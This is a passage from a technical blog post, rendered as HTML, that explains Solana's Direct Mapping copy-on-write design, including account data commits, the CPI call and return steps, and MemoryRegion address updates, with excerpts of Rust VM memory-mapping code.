</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">49</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> len </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">T</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">50</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">51</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> cache </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cache</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">52</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">53</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> src </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span>value </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> _ </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">54</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">55</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">find_region</span><span class="token token" style="color:#ccc">(</span><span>cache</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">56</span><span>            </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#f08d49">ensure_writable_region</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cow_cb</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">57</span><span>                </span><span class="token token" style="color:#999">// fast path</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">58</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> region</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">vm_to_host</span><span class="token token" style="color:#ccc">(</span><span>vm_addr</span><span class="token token" style="color:#ccc">,</span><span> len</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">59</span><span>                    </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">60</span><span>                    </span><span class="token token" style="color:#999">// vm_to_host() succeeded so we know there&#x27;s enough space to</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">61</span><span>                    </span><span class="token token" style="color:#999">// store `value`</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">62</span><span>                    </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">write_unaligned</span><span class="token token" style="color:#ccc">(</span><span>host_addr </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> _</span><span class="token token" style="color:#ccc">,</span><span> value</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">63</span><span>                    </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">64</span><span>                </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">65</span>                region
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">66</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">67</span><span>            _ </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">68</span><span>                </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f08d49">generate_access_violation</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>config</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Store</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">,</span><span> len</span><span class="token token" style="color:#ccc">,</span><span> pc</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">69</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">70</span><span>        </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">71</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">72</span><span>        </span><span class="token token" style="color:#999">// slow path, handle writes that span multiple memory regions</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">73</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">74</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">75</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">76</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<h3 class="text-3xl py-4 border-b border-white/10">Commit Process Changes</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">The new CoW strategy also changes how account data is committed due to the mapping constraints:</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><strong>Directly Mapped Data</strong>: The original data length portion has already been modified through direct mapping and requires no additional copying.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><strong>Growth Area Data</strong>: When programs expand account data using <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">realloc()</code>, the new data initially lives in the reserved buffer space within the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> section. Since the reserved buffer isn&#x27;t mapped to host memory (we can only map the exact current data size), an additional copy operation is required to move growth data from the unmapped reserved buffer to the actual account data buffer in host memory.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">This mapping constraint means that while Direct Mapping eliminates copying for existing data, growth scenarios still require copying from the unmapped reserved space.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Impact on Cross-Program Invocation</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">With data writes handled, the next thing to understand is how CPI works under the new design.</p>
<h4 class="text-2xl py-4 border-b border-white/10">CPI Call Process</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">The CPI call process remains quite similar to the original design. Most steps are unchanged:</p>
<ol class="text-xl py-2 text-pretty sm:text-justify" style="display:block;list-style-type:decimal;padding-inline-start:40px">
<li>Retrieve metadata of accounts involved in the CPI instruction</li>
<li>Look up corresponding <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> from the TransactionContext</li>
<li>Translate guest addresses in <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo</code> into host pointers to construct <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount</code> structures</li>
<li>Update reserved buffer and validate account changes and write them back to <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code></li>
<li>Serialize <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> into callee program&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> section</li>
</ol>
<p class="text-xl py-3 text-pretty sm:text-justify">A minor difference is, before step 4 validation, instead of copying the entire account data, we only copy newly grown data that&#x27;s still in the reserved buffer back to the newly allocated direct-mapped buffer and verify other fields then write them back into <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code>.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/new_cpi_call.png" alt="New CPI Call"/></p>
<h4 class="text-2xl py-4 border-b border-white/10">CPI Return Process</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">The major differences occur when returning from a CPI call. Since we&#x27;re using direct mapping, Vector CoW operations might occur during nested calls, requiring us to check if the original data buffer mapping has been relocated.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">1-1. Copy data from reserved buffer back to the directly mapped data buffer.
1-2. Validate all account changes using the same rules as single program execution
2. Check if data buffer was relocated during CoW operations, if relocation occurred, update the parent&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code> to reflect the change
3. Ensure the account data length hasn&#x27;t exceeded the limits expected by the caller program
4. Write the consolidated account changes back into the parent program&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Notably, steps 2 is a new action introduced by Direct Mapping. Since Vector CoW operations might occur during nested calls, we must detect buffer relocations and update memory mappings to maintain consistency.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/new_cpi_return.png" alt="New CPI Return"/></p>
<h3 class="text-3xl py-4 border-b border-white/10">The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> Update Mechanism</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">When CoW operations relocate account data buffers during CPI execution, the parent program&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegions</code> still point to the old buffer locations, we need to update it to reflect the change. So how exactly does the update mechanism look like?</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> manage virtual-to-host address mappings, with each region covering non-overlapping virtual address ranges. When a buffer gets relocated, we need to identify which specific <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> needs updating and modify its <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> to point to the new location.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Solana uses the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_data_addr</code> field stored in <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount</code> to locate the correct <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>:</p>
<ol class="text-xl py-2 text-pretty sm:text-justify" style="display:block;list-style-type:decimal;padding-inline-start:40px">
<li><strong>Locate the Target Region</strong>: Use <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_data_addr</code> to find the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> that maps the account&#x27;s data. This address should correspond to a virtual address within one of the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>&#x27;s ranges.</li>
<li><strong>Compare Buffer Addresses</strong>: Check if the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>&#x27;s current <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> matches the account&#x27;s actual data buffer address in <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code>. If they differ, a relocation occurred during CoW operations.</li>
<li><strong>Update the Mapping</strong>: Replace the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> with the new buffer address from <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code>, ensuring future VM memory accesses resolve to the correct location.</li>
<li><strong>Complete the Update</strong>: After updating <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code>, when the parent program accesses memory at the same virtual address, it will now correctly resolve to the relocated buffer location.</li>
</ol>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/memoryregion_update.png" alt="MemoryRegion Update"/></p>
<p class="text-xl py-3 text-pretty sm:text-justify">This mechanism relies on an assumption: that <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_data_addr</code> accurately identifies the correct <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> to update.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The code of searching for a region containing some specific <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_addr</code> is shown here</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">impl</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f8c555">UnalignedMemoryMapping</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">find_region</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span> cache</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">MappingCache</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Option</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryRegion</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>        </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>index</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> cache</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">find</span><span class="token token" style="color:#ccc">(</span><span>vm_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>            </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>        </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#cc99cd">else</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> index </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>            </span><span class="token token" style="color:#999">// region_addresses is eytzinger ordered array of MemoryRegions, so we</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>            </span><span class="token token" style="color:#999">// do a binary search here </span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>            </span><span class="token token" style="color:#cc99cd">while</span><span> index </span><span class="token token" style="color:#67cdcc">&lt;=</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>region_addresses</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>                </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>                </span><span class="token token" style="color:#999">// we start the search at index=1 and in the loop condition check</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>                </span><span class="token token" style="color:#999">// for index &lt;= len, so bound checks can be avoided</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>                index </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">(</span><span>index </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>                    </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>region_addresses</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_unchecked</span><span class="token token" style="color:#ccc">(</span><span>index </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;=</span><span> vm_addr </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>                        </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">;</span><span>
